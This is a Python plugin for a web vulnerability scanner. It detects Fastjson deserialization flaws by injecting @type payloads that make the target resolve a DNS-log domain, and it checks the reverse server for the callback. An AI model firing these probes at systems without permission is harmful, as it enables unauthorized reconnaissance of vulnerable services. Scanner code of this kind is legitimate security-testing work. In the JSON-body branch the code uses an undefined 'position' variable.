#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# JiuZero 2025/8/20

import requests
from urllib.parse import quote
from lib.core.settings import acceptedExt
from lib.api.reverse_api import reverseApi
from api import generateResponse, random_str, conf, PLACE, VulType, POST_HINT, Type, PluginBase, Threads, KB, isjson
from helper.paramanalyzer import VulnDetector

class Z0SCAN(PluginBase):
    name = "fastjson-blind"
    desc = 'fastjson-blind'
    version = "2025.8.20"
    risk = 2
    require_reverse = True
    
    def audit(self):
        if conf.level == 0 or not self.risk in conf.risk or self.fingerprints.waf:
            return
        if self.requests.suffix in acceptedExt:
            payloads = [
                '''{"RANDOM": {"@type": "java.net.Inet4Address", "val": "DOMAIN"}}''',
                '''Set[{"@type":"java.net.URL","val":"http://DOMAIN"}''',
                '''{{"@type":"java.net.URL","val":"http://DOMAIN"}:0''',
                '''{"@type":"java.net.InetSocketAddress"{"address":,"val":"DOMAIN"}}''',
                ]
            self.rA = reverseApi()
            if self.requests.post_hint == POST_HINT.JSON:
                for type in ["dns"]:
                    if type in KB.reverse_running_server:
                        token, fullname = self.generate(type)
                        for payload in payloads:
                            payload = payload.replace("RANDOM", random_str(4)).replace("DOMAIN", fullname)
                            r = requests.get(self.requests.url, params=self.requests.params, data=payload, headers=self.requests.headers)
                            if not r:
                                continue
                            if self.rA.check(token):
                                result = self.generate_result()
                                result.main({
                                    "type": Type.REQUEST, 
                                    "url": r.url, 
                                    "vultype": VulType.OTHER, 
                                    "show": {
                                        "Position": f"body", 
                                        "Payload": payload,
                                        "Msg": "Receive from Dnslog",
                                        }
                                    })
                                result.step("Request1", {
                                    "position": position,
                                    "request": r.reqinfo, 
                                    "response": generateResponse(r), 
                                    "desc": "Payload: {} Receive from Dnslog".format(payload),
                                    })
                                self.success(result)
                                break
            elif self.requests.params or self.requests.post_hint == POST_HINT.NORMAL or self.requests.post_hint == POST_HINT.ARRAY_LIKE:
                iterdatas = self.generateItemdatas()
                test_args = []
                for _ in iterdatas:
                    k, v, position = _
                    # 判断参数值是否为json格式
                    if isjson(v):
                        test_args.append(_)
                z0thread = Threads(name=self.name)
                z0thread.submit(self.process, test_args, payloads)
                
    def process(self, _, payloads):
        k, v, position = _
        if position in [PLACE.JSON_DATA, PLACE.MULTIPART_DATA, PLACE.XML_DATA]:
            return
        for type in ["dns"]:
            if type in KB.reverse_running_server:
                token, fullname = self.generate(type)
                for payload in payloads:
                    payload = payload.replace("RANDOM", random_str(4)).replace("DOMAIN", fullname)
                    _payload = self.insertPayload({
                        "key": k, 
                        "payload": payload, 
                        "position": position, 
                        })
                    r = self.req(position, _payload)
                    if not r:
                        continue
                    if self.rA.check(token):
                        result = self.generate_result()
                        result.main({
                            "type": Type.REQUEST, 
                            "url": r.url, 
                            "vultype": VulType.OTHER, 
                            "show": {
                                "Position": f"{position} >> {k}", 
                                "Payload": payload,
                                "Msg": "Receive from Dnslog",
                                }
                            })
                        result.step("Request1", {
                            "position": position,
                            "request": r.reqinfo, 
                            "response": generateResponse(r), 
                            "desc": "Payload: {} Receive from Dnslog".format(payload),
                            })
                        self.success(result)
                        break
        
